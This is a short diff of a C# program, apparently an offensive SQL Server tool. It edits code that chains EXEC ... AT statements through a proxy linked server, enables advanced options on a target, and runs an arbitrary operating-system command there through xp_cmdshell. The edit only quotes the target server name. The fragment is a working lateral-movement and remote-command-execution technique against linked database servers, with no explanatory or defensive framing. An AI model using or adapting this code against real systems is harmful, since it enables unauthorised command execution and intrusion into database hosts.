@@ -64,12 +64,12 @@ namespace SQL
             if (cmd != "")
             {
                 Console.WriteLine("Attempting to execute " + cmd + " on " + target);
-                String enable_xp = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT " + target + "') AT " + proxy;
+                String enable_xp = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"" + target + "\"') AT " + proxy;
                 command = new SqlCommand(enable_xp, con);
                 reader = command.ExecuteReader();
                 reader.Close();
 
-                String exec = "EXEC ('EXEC (''xp_cmdshell ''''" + cmd + "'''''') AT " + target + "') AT " + proxy;
+                String exec = "EXEC ('EXEC (''xp_cmdshell ''''" + cmd + "'''''') AT \"" + target + "\"') AT " + proxy;
                 //"select * from openquery(" + target + ",select * from openquery("+proxy+",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))'))";
                 command = new SqlCommand(exec, con);
                 reader = command.ExecuteReader();
